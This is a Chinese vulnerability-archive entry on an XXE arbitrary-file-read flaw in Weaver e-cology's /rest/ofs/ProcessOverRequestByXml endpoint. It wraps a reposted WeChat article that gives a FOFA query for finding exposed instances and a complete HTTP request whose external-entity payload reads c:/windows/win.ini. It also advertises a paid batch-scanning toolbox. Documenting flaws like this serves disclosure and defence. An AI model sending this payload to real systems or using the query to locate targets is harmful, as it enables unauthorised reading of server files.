---
source: "gelusus/wxvl 公众号漏洞文库"
title: "泛微e-cology ProcessOverRequestByXml XXE文件读取"
product: "泛微e-cology"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "未给版本；Windows文件例且XML外部实体可解析"
prerequisites: "样本无凭证，未明确前置鉴权"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_status: "unknown"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/OA%E5%8A%9E%E5%85%AC/%E6%B3%9B%E5%BE%AEoa/%E6%B3%9B%E5%BE%AEe-cology%20ProcessOverRequestByXml%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md"
id: "vw-d3e374b0e8ea14db2727fc26"
entity_id: "ve-d3e374b0e8ea14db2727fc26"
schema_version: "1"
---

# 泛微e-cology ProcessOverRequestByXml XXE文件读取

## 条目说明

- 对象与具体问题：泛微e-cology；ProcessOverRequestByXml XXE文件读取
- 版本、配置及部署条件：未给版本；Windows文件例且XML外部实体可解析
- 认证与权限前提：样本无凭证，未明确前置鉴权
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 应同时分类XXE根因与文件读取影响，不能仅泛称任意文件读取
- 完整XML实体例与端点明确，响应仅截图，缺补丁范围
- 与rest/ofs其他XXE接口相关但不同方法，不按同XXE去重
- 空CVE/CNNVD/CNVD标题、重复产品介绍和推广段可规范

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

南风漏洞复现文库  南风漏洞复现文库   2024-04-11 23:45  
  
免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
### 1. 泛微e-cology ProcessOverRequestByXml接口简介  
  
微信公众号搜索：南风漏洞复现文库 该文章 南风漏洞复现文库 公众号首发  
  
泛微e-cology依托全新的设计理念,全新的管理思想为中大型组织创建全新的高效协同办公环境。  
### 2.漏洞描述  
  
泛微e-cology依托全新的设计理念,全新的管理思想。 为中大型组织创建全新的高效协同办公环境。 智能语音办公,简化软件操作界面。 身份认证、电子签名、电子签章、数据存证让合同全程数字化。泛微e-cology ProcessOverRequestByXml接口存在任意文件读取漏洞  
  
CVE编号:  
  
CNNVD编号:  
  
CNVD编号:  
### 3.影响版本  
  
泛微e-cology  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3YhmerYemFP4AQLlYlWjggPeaCQ6lxOcVVnIfxr7sU3sjnL6TEA5apBOicCkV4zZUf59giaMpgfgoXQ/640?wx_fmt=jpeg&from=appmsg "null")  
  
泛微e-cology ProcessOverRequestByXml接口存在任意文件读取漏洞  
### 4.fofa查询语句  
  
body="/js/ecology8" || body="wui/common/css/w7OVFont_wev8.css" || (body="weaver" && body="ecology") || (header="ecology_JSessionId" && body="login/Login.jsp") || body="/wui/index.html" || body="jquery_wev8" && body="/login/Login.jsp?logintype=1"  
### 5.漏洞复现  
  
漏洞链接：http://127.0.0.1/rest/ofs/ProcessOverRequestByXml  
  
漏洞数据包：  
```http
POST /rest/ofs/ProcessOverRequestByXml HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Host: 127.0.0.1
Content-Type: application/xml
Content-Length: 146

<?xml version="1.0" encoding="utf-8" ?><!DOCTYPE test[<!ENTITY test SYSTEM "file:///c:/windows/win.ini">]><reset><syscode>&test;</syscode></reset>
```  

> 请求长度说明：原资料 Content-Length 为 146；保留原始标头；其数值未据实际请求体重新计算或验证。
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3YhmerYemFP4AQLlYlWjggPK8o0bbowreiacDhDbrpLia2dqOJ3icSmibMEapGjrHCTVRqo8xOIvAYoRA/640?wx_fmt=jpeg&from=appmsg "null")  
### 6.POC&EXP  
  
本期漏洞及往期漏洞的批量扫描POC及POC工具箱已经上传知识星球：南风网络安全1: 更新poc批量扫描软件，承诺，一周更新8-14个插件吧，我会优先写使用量比较大程序漏洞。2: 免登录，免费fofa查询。3: 更新其他实用网络安全工具项目。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3YhmerYemFP4AQLlYlWjggPiaefydDicEjFO8spVsic6NdNDvgAia8mWTjUBu7sz6Koictk9u5GpWCNeLA/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3YhmerYemFP4AQLlYlWjggPNsgHSwZjN5UHdY2xFo2YWiaJwqB8KAYXQkm5gy1LtRr2y18nFwwlrkQ/640?wx_fmt=jpeg&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3YhmerYemFP4AQLlYlWjggPbTTRKkyah5r5dTjYK6P0I2uYFMnhl7F1iaFVJJ0MrBKKvJncDELxclw/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3YhmerYemFP4AQLlYlWjggPY0odmDaru8PqCq7SGw8zhMDK8O2GQibQmiaCaAuXic7Y2LIMdWrD2xC5g/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3YhmerYemFP4AQLlYlWjggP2RPJQasVNwPllHYIQK5smIEbcvtRznA28Xm9vG8zZszickb3oeakV7Q/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3YhmerYemFP4AQLlYlWjggPqeL1etiakSyCkkspA9wxBpn72l1OlNZ7zngRfABDTK6BrcWU7bBZl0w/640?wx_fmt=jpeg&from=appmsg "null")  
### 7.整改意见  
  
请联系官方打补丁：https://www.weaver.com.cn/e9/  
### 8.往期回顾  
  
[科荣AIO ReadFile存在任意文件读取漏洞](http://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247486137&idx=1&sn=0458efb9a23f7e3a9d497bd77a4d3c7a&chksm=974b87bea03c0ea8f74df9eebf388808ef260af92abd6a592904328b49913c968de9c70fd227&scene=21#wechat_redirect)  
  
  
[浙大恩特客户资源管理系统RegulatePriceAction.entsoft;.js接口存在SQL注入漏洞](http://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247486123&idx=1&sn=20bcfc57f151f3d39984f1a579e7e172&chksm=974b87aca03c0ebae04a1b736e04f05a1d0f3a739a41774f2b2223cab29b7b5ae7c3e7c03774&scene=21#wechat_redirect)  
  
  
  
  


---

> 来源：gelusus/wxvl（微信公众号漏洞文章自动归档，原文见文首链接）
